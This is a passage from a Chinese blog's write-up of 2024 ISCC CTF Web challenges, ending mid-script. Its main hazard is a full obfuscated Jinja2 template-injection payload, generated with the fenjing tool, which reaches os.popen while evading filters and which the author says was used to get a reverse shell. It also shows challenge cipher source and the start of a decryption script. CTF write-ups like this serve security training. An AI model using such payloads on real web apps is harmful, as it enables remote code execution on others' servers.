    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../index.html" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="../../../../links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('../../../../img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2024 ISCC 个人挑战赛"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        tenstrings
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-05-31 11:50" pubdate>
          2024年5月31日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          19k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          106 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2024 ISCC 个人挑战赛</h1>
            
            
              <div class="markdown-body">
                
                <p>今年 ISCC 的 misc 都挺正常，不过喜提一个非预期，血赚 50 分（</p>
<p>下面是 WriteUp</p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Web-还没想好名字的塔防游戏"><a href="#Web-还没想好名字的塔防游戏" class="headerlink" title="Web-还没想好名字的塔防游戏"></a>Web-还没想好名字的塔防游戏</h4><p><img src="../../../../img/archives/2024ISCC05/ef757770b0929cabb4a20189c0adf7a5.png" srcset="/img/loading.gif" lazyload> 分析网站源码，寻找 hint 或提示</p>
<p><img src="../../../../img/archives/2024ISCC05/2852dcee8b5ca69a4cbb099b920504ea.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/581010e0b6b3eef14a4bffffa1b85c8e.png" srcset="/img/loading.gif" lazyload> 下载网页源码进行对比</p>
<p>尝试将三段 hint 连接提交，和连上标题提交都不正确</p>
<p>最后提交标题和三次提示中每个大写字母成功 <img src="../../../../img/archives/2024ISCC05/3e1074c4f98ad4667a368d2af12a1e21.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="Web-回来吧永远滴神"><a href="#Web-回来吧永远滴神" class="headerlink" title="Web 回来吧永远滴神"></a>Web 回来吧永远滴神</h4><p><img src="../../../../img/archives/2024ISCC05/19f1641415691d10aa9499dbbe314cb9.png" srcset="/img/loading.gif" lazyload> 打开网页发现是 EDG 图片，提示第一个 flag 藏在看的见的地方</p>
<p><img src="../../../../img/archives/2024ISCC05/e21fe39ff78908ee6344906096a30b1e.png" srcset="/img/loading.gif" lazyload> 输入正确后进入隐藏关卡</p>
<p><img src="../../../../img/archives/2024ISCC05/23e0b145a7302a06a5e24cd20d9e6f7c.png" srcset="/img/loading.gif" lazyload> 查看源代码，发现 integrity 的值存在问题，通常 integrity 应该是 hash 值，这里是 base64，对 base64 进行解密得到 hex，hex 转 str 得到第一部分 flag</p>
<p>Flag [0]: I{DSK6Fj7c</p>
<p><img src="../../../../img/archives/2024ISCC05/e8199b45d18f007dbf3d074dcfcc673a.png" srcset="/img/loading.gif" lazyload> <img src="./../../../../img/archives/2024ISCC05/5eb4199eef66f311d337c46dc76f6180.png" srcset="/img/loading.gif" lazyload> 用 fenjing 的 exec_cmd_payload 模块去跑 payload，跑出 payload 反弹 shell</p>
<p>反弹 shell 后查看目录下的文件，发现 flag1 flag2，结合</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%<span class="hljs-built_in">set</span> pp=<span class="hljs-built_in">dict</span>(POP=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> yl=<span class="hljs-built_in">dict</span>(OS=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> po=<span class="hljs-built_in">dict</span>(POPEN=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> re=<span class="hljs-built_in">dict</span>(READ=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> gl=<span class="hljs-built_in">dict</span>(GLOBALS=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> go=lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>~gl~lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>%&#125;&#123;%<span class="hljs-built_in">set</span> ge=<span class="hljs-built_in">dict</span>(GETITEM=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> gi=lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>~ge~lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bu=<span class="hljs-built_in">dict</span>(BUILTINS=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> bl=lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>~bu~lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>%&#125;&#123;%<span class="hljs-built_in">set</span> im=<span class="hljs-built_in">dict</span>(IMPORT=x)|first|lower%&#125;&#123;%<span class="hljs-built_in">set</span> ip=lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>~im~lipsum|escape|batch((lla,lla)|<span class="hljs-built_in">sum</span>)|<span class="hljs-built_in">list</span>|first|last*(la,la)|<span class="hljs-built_in">sum</span>%&#125;&#123;%<span class="hljs-built_in">set</span> ty=lipsum()|urlencode|first%&#125;&#123;%<span class="hljs-built_in">set</span> jd=namespace|escape|count%&#125;&#123;%<span class="hljs-built_in">set</span> tn=joiner|urlencode|wordcount%&#125;&#123;%<span class="hljs-built_in">set</span> ql=namespace|escape|urlencode|escape|urlencode|count%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lx=<span class="hljs-built_in">dict</span>(a=x,b=x,c=x)|length%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> dp=<span class="hljs-built_in">dict</span>(aaaaa=x)|first|length%&#125;&#123;%<span class="hljs-built_in">set</span> zb=(lx,la)|<span class="hljs-built_in">sum</span>%&#125;&#123;%<span class="hljs-built_in">set</span> et=(lla,lla,lla,zb)|<span class="hljs-built_in">sum</span>%&#125;&#123;%<span class="hljs-built_in">set</span> ba=((ty~<span class="hljs-built_in">dict</span>(c=x)|join)*(jd,tn,la)|<span class="hljs-built_in">sum</span>)%((ql,tn,la)|<span class="hljs-built_in">sum</span>,(ql,tn)|<span class="hljs-built_in">sum</span>,(llla,zb)|<span class="hljs-built_in">sum</span>,(ql,lla,lx)|<span class="hljs-built_in">sum</span>,(lla,lla,tn,lx)|<span class="hljs-built_in">sum</span>,(et,tn,la)|<span class="hljs-built_in">sum</span>,(ql,tn,la,la)|<span class="hljs-built_in">sum</span>,(lla,lla,tn,lx)|<span class="hljs-built_in">sum</span>,(lla,lla,lla,la)|<span class="hljs-built_in">sum</span>,(ql,tn,la)|<span class="hljs-built_in">sum</span>,(ql,tn)|<span class="hljs-built_in">sum</span>,(llla,zb)|<span class="hljs-built_in">sum</span>,(ql,lla,lx)|<span class="hljs-built_in">sum</span>,(lla,lla,tn,lx)|<span class="hljs-built_in">sum</span>,(et,tn,la)|<span class="hljs-built_in">sum</span>,(ql,lla,zb)|<span class="hljs-built_in">sum</span>,(lla,lla,tn,lx)|<span class="hljs-built_in">sum</span>,(sbb,bb)|<span class="hljs-built_in">sum</span>,(et,la)|<span class="hljs-built_in">sum</span>,(lla,lla,tn,lx)|<span class="hljs-built_in">sum</span>,(jd,la)|<span class="hljs-built_in">sum</span>,(ql,tn,lx)|<span class="hljs-built_in">sum</span>,(ql,lla)|<span class="hljs-built_in">sum</span>,(llla,tn)|<span class="hljs-built_in">sum</span>,(jd,la)|<span class="hljs-built_in">sum</span>,(llla,dp)|<span class="hljs-built_in">sum</span>,(ql,tn,la,la)|<span class="hljs-built_in">sum</span>,(llla,la)|<span class="hljs-built_in">sum</span>,(jd,la)|<span class="hljs-built_in">sum</span>,(jd,tn,la)|<span class="hljs-built_in">sum</span>,(jd,lx)|<span class="hljs-built_in">sum</span>,jd,(jd,lx)|<span class="hljs-built_in">sum</span>,(jd,dp)|<span class="hljs-built_in">sum</span>,(sbb,la)|<span class="hljs-built_in">sum</span>,jd,(jd,tn,la)|<span class="hljs-built_in">sum</span>,(jd,tn)|<span class="hljs-built_in">sum</span>,jd,(jd,lx)|<span class="hljs-built_in">sum</span>,(jd,dp)|<span class="hljs-built_in">sum</span>,(jd,tn)|<span class="hljs-built_in">sum</span>,(jd,la)|<span class="hljs-built_in">sum</span>,(jd,tn)|<span class="hljs-built_in">sum</span>,sbb,(jd,lx)|<span class="hljs-built_in">sum</span>,(jd,lx)|<span class="hljs-built_in">sum</span>,(sbb,la)|<span class="hljs-built_in">sum</span>,(lla,lla,tn,lx)|<span class="hljs-built_in">sum</span>,(jd,la,la)|<span class="hljs-built_in">sum</span>,(sbb,bb)|<span class="hljs-built_in">sum</span>,(et,la)|<span class="hljs-built_in">sum</span>,(jd,lx)|<span class="hljs-built_in">sum</span>,(lla,lla,lla,la)|<span class="hljs-built_in">sum</span>)%&#125;&#123;%<span class="hljs-built_in">print</span> ((g|attr(pp)|attr(go)|attr(gi)(bl)|attr(gi)(ip))(yl)|attr(po))(ba)|attr(re)()%&#125;<br></code></pre></td></tr></table></figure>

<p>前面的 flag0 可以看出是栅栏密码，但还缺失一部分 flag</p>
<p>Flag [1]: SHvVBCB9Xa</p>
<p>Flag [2]: C5f_Y*4CI6</p>
<p><img src="../../../../img/archives/2024ISCC05/3a01cfeaa768643b04428455865c3ffe.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/070aad5f26566ada12435c69bb7fc029.png" srcset="/img/loading.gif" lazyload></p>
<p>Find 查看 suid 权限命令未发现内容，猜测是源码审计或 CVE</p>
<p>分析网页代码，在 app.py 中发现 flag3 的有关内容，下载源码进行审计</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;pre&gt;<br><span class="hljs-keyword">from</span> <span class="hljs-title class_">Crypto</span>.<span class="hljs-property">Util</span>.<span class="hljs-property">Padding</span> <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> <span class="hljs-title class_">Crypto</span>.<span class="hljs-property">Util</span>.<span class="hljs-property">number</span> <span class="hljs-keyword">import</span> bytes_to_long <span class="hljs-keyword">as</span> b2l, long_to_bytes <span class="hljs-keyword">as</span> l2b<br><span class="hljs-keyword">from</span> <span class="hljs-title class_">Crypto</span>.<span class="hljs-property">Random</span> <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> <span class="hljs-title class_">Enum</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mode</span>(<span class="hljs-title class_">Enum</span>):<br>    <span class="hljs-variable constant_">ECB</span> = <span class="hljs-number">0x01</span><br>    <span class="hljs-variable constant_">CBC</span> = <span class="hljs-number">0x02</span><br>    <span class="hljs-variable constant_">CFB</span> = <span class="hljs-number">0x03</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span>:<br>    def <span class="hljs-title function_">__init__</span>(self, key, iv=<span class="hljs-title class_">None</span>):<br>        self.<span class="hljs-property">BLOCK_SIZE</span> = <span class="hljs-number">64</span><br>        self.<span class="hljs-property">KEY</span> = [<span class="hljs-title function_">b2l</span>(key[<span class="hljs-attr">i</span>:i+self.<span class="hljs-property">BLOCK_SIZE</span><span class="hljs-comment">//16]) for i in range(0, len(key), self.BLOCK_SIZE//16)]</span><br>        self.<span class="hljs-property">DELTA</span> = <span class="hljs-number">0x9e3779b9</span><br>        self.<span class="hljs-property">IV</span> = iv<br>        self.<span class="hljs-property">ROUNDS</span> = <span class="hljs-number">64</span><br>        <span class="hljs-keyword">if</span> self.<span class="hljs-property">IV</span>:<br>            self.<span class="hljs-property">mode</span> = <span class="hljs-title class_">Mode</span>.<span class="hljs-property">CBC</span> <span class="hljs-keyword">if</span> iv <span class="hljs-keyword">else</span> <span class="hljs-title class_">Mode</span>.<span class="hljs-property">ECB</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span>(self.<span class="hljs-property">IV</span>) * <span class="hljs-number">8</span> != self.<span class="hljs-property">BLOCK_SIZE</span>:<br>                self.<span class="hljs-property">mode</span> = <span class="hljs-title class_">Mode</span>.<span class="hljs-property">CFB</span><br>    def <span class="hljs-title function_">_xor</span>(self, a, b):<br>        <span class="hljs-keyword">return</span> b<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-title function_">join</span>(<span class="hljs-title function_">bytes</span>([_a ^ _b]) <span class="hljs-keyword">for</span> _a, _b <span class="hljs-keyword">in</span> <span class="hljs-title function_">zip</span>(a, b))<br>    def <span class="hljs-title function_">encrypt_block</span>(self, msg):<br>        m0 = <span class="hljs-title function_">b2l</span>(msg[:<span class="hljs-number">4</span>])<br>        m1 = <span class="hljs-title function_">b2l</span>(msg[<span class="hljs-number">4</span>:])<br>        msk = (<span class="hljs-number">1</span> &lt;&lt; (self.<span class="hljs-property">BLOCK_SIZE</span><span class="hljs-comment">//2)) - 1</span><br>        s = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(self.<span class="hljs-property">ROUNDS</span>):<br>            s += self.<span class="hljs-property">DELTA</span><br>            m0 += ((m1 &lt;&lt; <span class="hljs-number">4</span>) + self.<span class="hljs-property">KEY</span>[i % <span class="hljs-title function_">len</span>(self.<span class="hljs-property">KEY</span>)]) ^ (m1 + s) ^ ((m1 &gt;&gt; <span class="hljs-number">5</span>) + self.<span class="hljs-property">KEY</span>[(i+<span class="hljs-number">1</span>) % <span class="hljs-title function_">len</span>(self.<span class="hljs-property">KEY</span>)])<br>            m0 &amp;= msk<br>            m1 += ((m0 &lt;&lt; <span class="hljs-number">4</span>) + self.<span class="hljs-property">KEY</span>[(i+<span class="hljs-number">2</span>) % <span class="hljs-title function_">len</span>(self.<span class="hljs-property">KEY</span>)]) ^ (m0 + s) ^ ((m0 &gt;&gt; <span class="hljs-number">5</span>) + self.<span class="hljs-property">KEY</span>[(i+<span class="hljs-number">3</span>) % <span class="hljs-title function_">len</span>(self.<span class="hljs-property">KEY</span>)])<br>            m1 &amp;= msk<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">l2b</span>((m0 &lt;&lt; (self.<span class="hljs-property">BLOCK_SIZE</span><span class="hljs-comment">//2)) | m1)</span><br>    def <span class="hljs-title function_">encrypt</span>(self, msg):<br>        msg = <span class="hljs-title function_">pad</span>(msg, self.<span class="hljs-property">BLOCK_SIZE</span><span class="hljs-comment">//8)</span><br>        blocks = [msg[<span class="hljs-attr">i</span>:i+self.<span class="hljs-property">BLOCK_SIZE</span><span class="hljs-comment">//8] for i in range(0, len(msg), self.BLOCK_SIZE//8)]</span><br>        ct = b<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> self.<span class="hljs-property">mode</span> == <span class="hljs-title class_">Mode</span>.<span class="hljs-property">ECB</span>:<br>            <span class="hljs-keyword">for</span> pt <span class="hljs-keyword">in</span> <span class="hljs-attr">blocks</span>:<br>                ct += self.<span class="hljs-title function_">encrypt_block</span>(pt)<br>        elif self.<span class="hljs-property">mode</span> == <span class="hljs-title class_">Mode</span>.<span class="hljs-property">CBC</span>:<br>            X = self.<span class="hljs-property">IV</span><br>            <span class="hljs-keyword">for</span> pt <span class="hljs-keyword">in</span> <span class="hljs-attr">blocks</span>:<br>                enc_block = self.<span class="hljs-title function_">encrypt_block</span>(self.<span class="hljs-title function_">_xor</span>(X, pt))<br>                ct += enc_block<br>                X = enc_block<br>        elif self.<span class="hljs-property">mode</span> == <span class="hljs-title class_">Mode</span>.<span class="hljs-property">CFB</span>:<br>            X = self.<span class="hljs-property">IV</span><br>            <span class="hljs-keyword">for</span> pt <span class="hljs-keyword">in</span> <span class="hljs-attr">blocks</span>:<br>                output = self.<span class="hljs-title function_">encrypt_block</span>(X)<br>                enc_block = self.<span class="hljs-title function_">_xor</span>(output, pt)<br>                ct += enc_block<br>                X = enc_block<br>        <span class="hljs-keyword">return</span> ct<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-variable constant_">KEY</span> = <span class="hljs-title function_">get_random_bytes</span>(<span class="hljs-number">16</span>)<br>    <span class="hljs-variable constant_">IV</span> = <span class="hljs-title function_">get_random_bytes</span>(<span class="hljs-number">8</span>)<br>    cipher = <span class="hljs-title class_">Cipher</span>(<span class="hljs-variable constant_">KEY</span>, <span class="hljs-variable constant_">IV</span>)<br>    <span class="hljs-variable constant_">FLAG</span> = b<span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span><br>    ct = cipher.<span class="hljs-title function_">encrypt</span>(<span class="hljs-variable constant_">FLAG</span>)<br>    # <span class="hljs-attr">KEY</span>: <span class="hljs-number">3362623866656338306539313238353733373566366338383563666264386133</span><br>    <span class="hljs-title function_">print</span>(f<span class="hljs-string">&#x27;KEY: &#123;&#123;KEY.hex()&#125;&#125;&#x27;</span>)<br>    # <span class="hljs-attr">IV</span>: <span class="hljs-number">64343537373337663034346462393931</span><br>    <span class="hljs-title function_">print</span>(f<span class="hljs-string">&#x27;IV: &#123;&#123;IV.hex()&#125;&#125;&#x27;</span>)<br>    # <span class="hljs-title class_">Ciphertext</span>: 1cb8db8cabe8edbbddb236d5eb6f0cdeb610e9af855b52d3<br>    <span class="hljs-title function_">print</span>(f<span class="hljs-string">&#x27;Ciphertext: &#123;&#123;ct.hex()&#125;&#125;&#x27;</span>)<br>&lt;/pre&gt;<br>    <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p>源码中与 flag3 有关的部分，逆向脚本加密过程进行解密（解密脚本见 exp）</p>
<p><img src="../../../../img/archives/2024ISCC05/e5ec5c453daf5124f95c2f90d980f8f3.png" srcset="/img/loading.gif" lazyload></p>
<p>Flag [3]: CFCYm6Gs*}</p>
<p>拼接 4 部分 flag 进行栅栏密码解密</p>
<p><img src="../../../../img/archives/2024ISCC05/92df8e02fbd4022d54a37cd507199de1.png" srcset="/img/loading.gif" lazyload></p>
<p>得到 flag</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long <span class="hljs-keyword">as</span> b2l, long_to_bytes <span class="hljs-keyword">as</span> l2b<br><span class="hljs-keyword">from</span> enum <span class="hljs-keyword">import</span> Enum<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Mode</span>(<span class="hljs-title class_ inherited__">Enum</span>):<br>    ECB = <span class="hljs-number">0x01</span><br>    CBC = <span class="hljs-number">0x02</span><br>    CFB = <span class="hljs-number">0x03</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-variable language_">self</span>.BLOCK_SIZE = <span class="hljs-number">64</span><br>        <span class="hljs-variable language_">self</span>.KEY = [b2l(key[i:i+<span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-variable language_">self</span>.BLOCK_SIZE//<span class="hljs-number">16</span>)]<br>        <span class="hljs-variable language_">self</span>.DELTA = <span class="hljs-number">0x9e3779b9</span><br>        <span class="hljs-variable language_">self</span>.IV = iv<br>        <span class="hljs-variable language_">self</span>.ROUNDS = <span class="hljs-number">64</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.IV:<br>            <span class="hljs-variable language_">self</span>.mode = Mode.CBC <span class="hljs-keyword">if</span> iv <span class="hljs-keyword">else</span> Mode.ECB<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.IV) * <span class="hljs-number">8</span> != <span class="hljs-variable language_">self</span>.BLOCK_SIZE:<br>                <span class="hljs-variable language_">self</span>.mode = 